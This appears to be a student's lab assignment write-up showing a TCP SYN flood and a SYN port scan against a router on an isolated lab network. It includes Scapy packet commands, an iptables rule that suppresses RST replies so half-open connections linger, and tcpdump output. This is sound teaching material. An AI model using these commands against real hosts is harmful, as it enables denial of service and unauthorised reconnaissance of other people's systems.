Home Assignement 1
==================
Aurélien Labate (EFJIOD)

The following network configuration will be used during this exercice.
![Network](network.png)

Part 1 - Perform a TCP SYN Attack
---------------------------------
The goal of a TCP SYN attack is generally to create a deny of service by
opening a lot of TCP connections on the target's computer.

### TCP SYN Exchange when target's port is closed

**Scapy command**: Send a SYN packet on the TCP port 80
```
send(IP(dst="10.0.0.2")/TCP(dport=80,flags="S"))
```

**tcpdump** on `R2`:
```
16:41:25.123960 IP 10.0.0.1.20 > 10.0.0.2.80: Flags [S], seq 0, win 8192, length 0
16:41:25.124014 IP 10.0.0.2.80 > 10.0.0.1.20: Flags [R.], seq 0, ack 1, win 0, length 0
```

We can see that `R2` answer with a `[R.]`, which mean `RESET` and `ACK`.
In this case, `R2` has closed the connection because therei is no application listening on this port.

### TCP SYN Exchange when target's port is opened
The TCP port 23, is telnet's port which should be opened on this router.

**Scapy command**: Send a SYN packet on the TCP port 23
```
send(IP(dst="10.0.0.2")/TCP(dport=23,flags="S"))
```

**tcpdump** on `R2`:
```
16:46:56.600802 IP 10.0.0.1.20 > 10.0.0.2.23: Flags [S], seq 0, win 8192, length 0
16:46:56.600861 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 1502880524, ack 1, win 14600, options [mss 1460], length 0
16:46:56.601316 IP 10.0.0.1.20 > 10.0.0.2.23: Flags [R], seq 1, win 0, length 0
```
We can see here that `R2` answer with `[S.]`, which mean `SYN` and `ACK`.
After that, `R2` expect a `SYN` from `R1` to complete connection.

But `R1`'s TCP stack doesn't expect this `SYN-ACK` from `R1` so it close the connection
with a `RESET`.

### TCP SYN Attack
If `R1` don't send the final `RESET` package on an open port, the connection
should stay opened until timeout. That's what we want.

So we ask `R1`'s firewall to drop outgoing TCP `RESET` packet to `R2`
```
iptables -t raw -A OUTPUT -p tcp --tcp-flags RST RST -d 10.0.0.2 -j DROP
```

**tcpdump** on`R2`:
```
04:57:51.718419 IP 10.0.0.1.20 > 10.0.0.2.23: Flags [S], seq 0, win 8192, length 0
04:57:51.718464 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 3149158510, ack 1, win 14600, options [mss 1460], length 0
04:57:52.714863 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 3149158510, ack 1, win 14600, options [mss 1460], length 0
04:57:54.914846 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 3149158510, ack 1, win 14600, options [mss 1460], length 0
04:57:59.114800 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 3149158510, ack 1, win 14600, options [mss 1460], length 0
04:58:07.114834 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 3149158510, ack 1, win 14600, options [mss 1460], length 0
04:58:23.114784 IP 10.0.0.2.23 > 10.0.0.1.20: Flags [S.], seq 3149158510, ack 1, win 14600, options [mss 1460], length 0
```

We can see here that `R2` doesn't receive any `ACK` from `R1` so it try to
resend its `SYN-ACK` package. After 6 attempts, it give up.
The connection stayed open at least for 32 secondes which is a very long allocation
of resources because of a single TCP packet.

So if we send this packet in a loop we should be able to take a lot of ressources
from `R2` and maybe create a deny of service.


Part 2 - Construct a TCP port scanner
-------------------------------------
We have seen in the first part, that `R2` answer with `RESET` when port
is closed and `SYN-ACK` when port is opened.

So if we send a loop of `SYN` packet on each port we can find which port is opened :

**Scapy command**: Send a SYN packet for each dport from 1 to 2000
```
sr(IP(dst="10.0.0.2")/TCP(dport=(1,2000),flags="S"))
```
To get the answers we have to do

```
ans,unans = _
ans.summary( lambda(s,r): r.sprintf("%TCP.sport% \t %TCP.flags%") )
```

And we get something like that :
```
1 	 RA
2 	 RA
3 	 RA
4 	 RA
5 	 RA
6 	 RA
echo 	 RA
8 	 RA
discard 	 RA
10 	 RA
11 	 RA
12 	 RA
daytime 	 RA
14 	 RA
netstat 	 RA
16 	 RA
17 	 RA
18 	 RA
chargen 	 RA
ftp_data 	 RA
ftp 	 RA
ssh 	 RA
telnet 	 SA
24 	 RA
smtp 	 RA
26 	 RA
27 	 RA
28 	 RA
29 	 RA
30 	 RA
```

We can see the TCP flag associated to ports. For closed port this should be `RA` (for `RESET-ACK`).
For opened port this should be `SA` (for `SYN-ACK`).

We can see that the only open port is telnet's port (23).
